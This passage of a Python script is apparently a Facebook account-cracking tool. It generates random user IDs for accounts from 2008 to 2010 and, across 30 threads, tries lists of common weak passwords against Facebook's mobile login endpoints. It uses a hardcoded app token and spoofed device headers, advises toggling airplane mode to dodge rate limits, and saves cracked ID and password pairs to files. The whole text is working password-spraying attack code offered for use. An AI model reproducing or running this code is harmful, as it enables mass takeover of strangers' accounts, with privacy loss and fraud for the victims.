    print(f"{padding}\033[1;32m [–] TARGET : 2008-2009 SERIES\033[0m")
    linex()
    banner()
    print(f"{padding}\033[1;32m [–] EXAMPLE : 20000 / 30000 / 99999\033[0m")
    limit = input(f"{padding}\033[1;32m [–] TOTAL ID COUNT : \033[0m")
    linex()
    prefix = '1000004'
    for _ in range(int(limit) if limit.isdigit() else 20000):
        suffix = ''.join(random.choices('0123456789', k=8))
        uid = prefix + suffix
        user.append(uid)
    
    banner()
    print(f"{padding}\033[1;36m╔════════════════════════════════════════════╗\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;32m[1] \033[1;33m---> \033[1;37mMETHOD 1                        \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;32m[2] \033[1;33m---> \033[1;37mMETHOD 2                        \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;31m[0] \033[1;33m---> \033[1;37mBACK                            \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m╚════════════════════════════════════════════╝\033[0m")
    
    meth = input(f"{padding}\033[1;33m [-] CHOOSE ---> \033[0m").strip()
    with tred(max_workers=30) as pool:
        banner()
        print(f"{padding}\033[1;32m [–] TOTAL ID FROM CRACK : {limit}\033[0m")
        print(f"{padding}\033[1;32m [–] USE AIRPLANE MODE EVERY 5 MINUTES\033[0m")
        linex()
        for uid in user:
            if meth in ('1', 'A', 'a'):
                pool.submit(fb_login_1, uid)
            elif meth in ('2', 'B', 'b'):
                pool.submit(fb_login_2, uid)
            else:
                print(f"{padding}\033[1;31m [–] INVALID METHOD SELECTED\033[0m")
                break

def fb_login_1(uid):
    global loop
    session = requests.session()
    try:
        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mRAJA OK ID-M1\x1b[38;5;196m)(\x1b[1;37m\x1b[38;5;192m{loop}\x1b[38;5;196m)(\x1b[1;37mOK\x1b[38;5;196m)(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
        sys.stdout.flush()
        for pw in ('123456', '123123', '1234567890', '1234567', '12345678', '123456789', '000000', '111111'):
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': window1(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': '25227',
                'X-FB-SIM-HNI': '29752',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
            if 'session_key' in res:
                print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mRAJA \x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                open('/sdcard/RAJA-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                print(f"\r\r\x1b[1;37m(\x1b[1;37mRAJA VAU\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                open('/sdcard/RAJA-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
        loop += 1
    except Exception:
        time.sleep(5)

def fb_login_2(uid):
    global loop
    sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mRAJA -M2\x1b[38;5;196m)(\x1b[38;5;192m{loop}\x1b[38;5;196m)(\x1b[1;37mOK\x1b[38;5;196m)(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
    sys.stdout.flush()

    for pw in ('123456', '123123', '1234567', '12345678', '123456789', '1234567890', '000000', '111111'):
        try:
            with requests.Session() as session:
                headers = {
                    'x-fb-connection-bandwidth': str(random.randint(20000000, 29999999)),
                    'x-fb-sim-hni': str(random.randint(20000, 40000)),
                    'x-fb-net-hni': str(random.randint(20000, 40000)),
                    'x-fb-connection-quality': 'EXCELLENT',
                    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                    'user-agent': window1(),
                    'content-type': 'application/x-www-form-urlencoded',
                    'x-fb-http-engine': 'Liger'
                }
                url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
                po = session.get(url, headers=headers).json()
                if 'session_key' in str(po):
                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mRAJA XD\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                    open('/sdcard/RAJA-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                    oks.append(uid)
                    break
                elif 'session_key' in po:
                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m(\x1b[1;37mRAJA \x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                    open('/sdcard/RAJA-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                    oks.append(uid)
                    break
        except Exception:
            pass
    loop += 1

def old_2010_fb():
    global user
    user = []
    banner()
    width = max(get_width(), 40)
    padding = " " * max(0, (width - 44) // 2)
    print(f"{padding}\033[1;32m [–] TARGET : 2010 OLD F-B SERIES\033[0m")
    linex()
    banner()
    print(f"{padding}\033[1;32m [–] EXAMPLE : 20000 / 30000 / 99999\033[0m")
    limit = input(f"{padding}\033[1;32m [–] TOTAL ID COUNT : \033[0m")
    linex()
    prefixes = ['1000006', '1000007', '1000008', '1000009', '100001']
    for _ in range(int(limit) if limit.isdigit() else 20000):
        prefix = random.choice(prefixes)
        suffix = ''.join(random.choices('0123456789', k=9))
        uid = prefix + suffix
        user.append(uid)
    
    banner()
    print(f"{padding}\033[1;36m╔════════════════════════════════════════════╗\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;32m[1] \033[1;33m---> \033[1;37mMETHOD 1 (API LOGIN)        \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;32m[2] \033[1;33m---> \033[1;37mMETHOD 2 (PASSLIST LOGIN)   \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;31m[0] \033[1;33m---> \033[1;37mBACK                        \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m╚════════════════════════════════════════════╝\033[0m")
    
    meth = input(f"{padding}\033[1;33m [-] CHOOSE ---> \033[0m").strip()
    with tred(max_workers=30) as pool:
        banner()
        print(f"{padding}\033[1;32m [–] TOTAL ID FROM CRACK : {limit}\033[0m")
        print(f"{padding}\033[1;32m [–] USE AIRPLANE MOD FOR GOOD RESULT\033[0m")
        linex()
        for uid in user:
            if meth in ('1', 'A', 'a'):
                pool.submit(fb_2010_login_1, uid)
            elif meth in ('2', 'B', 'b'):
                pool.submit(fb_2010_login_2, uid)
            elif meth in ('0', '00'):
                BNG_71_()
            else:
                print(f"{padding}\033[1;31m [–] INVALID METHOD SELECTED\033[0m")
                break

def fb_2010_login_1(uid):
    global loop
    session = requests.session()
    try:
        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mRAJA 2010-M1\x1b[38;5;196m)(\x1b[1;37m\x1b[38;5;192m{loop}\x1b[38;5;196m)(\x1b[1;37mOK\x1b[38;5;196m)(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
        sys.stdout.flush()
        for pw in ['123456', '1234567', '12345678', '123456789', '123123', '143143', '1234567890']:
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': window1(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': '25227',
                'X-FB-SIM-HNI': '29752',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers).json()
            if 'session_key' in res:
                print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mRAJA 2010\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                open('/sdcard/RAJA-2010-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                print(f"\r\r\x1b[1;37m(\x1b[1;37mRAJA 2010\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                open('/sdcard/RAJA-2010-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
        loop += 1
    except Exception:
        time.sleep(5)

def fb_2010_login_2(uid):
    global loop
    sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mRAJA 2010-M2\x1b[38;5;196m)(\x1b[1;37m\x1b[38;5;192m{loop}\x1b[38;5;196m)(\x1b[1;37mOK\x1b[38;5;196m)(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
    sys.stdout.flush()

    passlist = ['first123', 'first1234', 'first12345', '123456', '123123', '12345678', '123456789']
    for pw in passlist:
        try:
            with requests.Session() as session:
                headers = {
                    'user-agent': window1(),
                    'content-type': 'application/x-www-form-urlencoded'
                }
                data = {
                    'email': uid,
                    'password': pw,
                    'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'format': 'json',
                    'device_id': str(uuid.uuid4()),
                    'locale': 'en_US',
                    'method': 'auth.login',
                    'fb_api_req_friendly_name': 'authenticate',
                    'generate_session_cookies': '1',
                    'source': 'device_based_login',
                    'credentials_type': 'device_based_login_password'
                }
                response = session.post('https://b-api.facebook.com/auth/login', data=data, headers=headers)
                if response.status_code == 200:
                    res = response.json()
                    if 'session_key' in res or res.get('access_token'):
                        print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mRAJA 2010 XD\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                        open('/sdcard/RAJA-2010-OK.txt', 'a').write(f"{uid}|{pw}\n")
                        oks.append(uid)
                        break
        except Exception:
            pass
    loop += 1

def old_2009_fb():
    global user
    user = []
    banner()
    width = max(get_width(), 40)
    padding = " " * max(0, (width - 44) // 2)
    print(f"{padding}\033[1;32m [–] TARGET : 2009 OLD F-B SERIES\033[0m")
    linex()
    banner()
    print(f"{padding}\033[1;32m [–] EXAMPLE : 20000 / 30000 / 99999\033[0m")
    limit = input(f"{padding}\033[1;32m [–] TOTAL ID COUNT : \033[0m")
    linex()
    prefixes = ['1000000', '1000001', '1000002', '1000003', '1000004', '1000005']
    for _ in range(int(limit) if limit.isdigit() else 20000):
        prefix = random.choice(prefixes)
        suffix = ''.join(random.choices('0123456789', k=8))
        uid = prefix + suffix
        user.append(uid)
    
    banner()
    print(f"{padding}\033[1;36m╔════════════════════════════════════════════╗\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;32m[1] \033[1;33m---> \033[1;37mMETHOD 1 (API LOGIN)        \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;32m[2] \033[1;33m---> \033[1;37mMETHOD 2 (PASSLIST LOGIN)   \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;31m[0] \033[1;33m---> \033[1;37mBACK                        \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m╚════════════════════════════════════════════╝\033[0m")
    
    meth = input(f"{padding}\033[1;33m [-] CHOOSE ---> \033[0m").strip()
    with tred(max_workers=30) as pool:
        banner()
        print(f"{padding}\033[1;32m [–] TOTAL ID FROM CRACK : {limit}\033[0m")
        print(f"{padding}\033[1;32m [–] USE AIRPLANE MOD FOR GOOD RESULT\033[0m")
        linex()
        for uid in user:
            if meth in ('1', 'A', 'a'):
                pool.submit(fb_2009_login_1, uid)
            elif meth in ('2', 'B', 'b'):
                pool.submit(fb_2009_login_2, uid)
            elif meth in ('0', '00'):
                BNG_71_()
            else:
                print(f"{padding}\033[1;31m [–] INVALID METHOD SELECTED\033[0m")
                break

def fb_2009_login_1(uid):
    global loop
    session = requests.session()
    try:
        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mRAJA 2009-M1\x1b[38;5;196m)(\x1b[1;37m\x1b[38;5;192m{loop}\x1b[38;5;196m)(\x1b[1;37mOK\x1b[38;5;196m)(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
        sys.stdout.flush()
        for pw in ['123456', '1234567', '12345678', '123456789', '123123', '143143', '1234567890']:
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': window1(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': '25227',
                'X-FB-SIM-HNI': '29752',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers).json()
            if 'session_key' in res:
                print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mRAJA 2009\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                open('/sdcard/RAJA-2009-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                print(f"\r\r\x1b[1;37m(\x1b[1;37mRAJA 2009\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                open('/sdcard/RAJA-2009-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
        loop += 1
    except Exception:
        time.sleep(5)

def fb_2009_login_2(uid):
    global loop
    sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mRAJA 2009-M2\x1b[38;5;196m)(\x1b[1;37m\x1b[38;5;192m{loop}\x1b[38;5;196m)(\x1b[1;37mOK\x1b[38;5;196m)(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
    sys.stdout.flush()

    passlist = ['first123', 'first1234', 'first12345', '123456', '123123', '12345678', '123456789']
    for pw in passlist:
        try:
            with requests.Session() as session:
                headers = {
                    'user-agent': window1(),
                    'content-type': 'application/x-www-form-urlencoded'
                }
                data = {
                    'email': uid,
                    'password': pw,
                    'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'format': 'json',
                    'device_id': str(uuid.uuid4()),
                    'locale': 'en_US',
                    'method': 'auth.login',
                    'fb_api_req_friendly_name': 'authenticate',
                    'generate_session_cookies': '1',
                    'source': 'device_based_login',
                    'credentials_type': 'device_based_login_password'
                }
                response = session.post('https://b-api.facebook.com/auth/login', data=data, headers=headers)
                if response.status_code == 200:
                    res = response.json()
                    if 'session_key' in res or res.get('access_token'):
                        print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mRAJA 2009 XD\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                        open('/sdcard/RAJA-2009-OK.txt', 'a').write(f"{uid}|{pw}\n")
                        oks.append(uid)
                        break
        except Exception:
            pass
    loop += 1

def file_cloning_old_fb():
    banner()
    width = max(get_width(), 40)
    padding = " " * max(0, (width - 44) // 2)
    print(f"{padding}\033[1;32m [–] File cloning Old-FB Tool Active\033[0m")
    linex()
    input(f"{padding}\033[1;33m [?] Press Enter to Back Menu... \033[0m")
    BNG_71_()
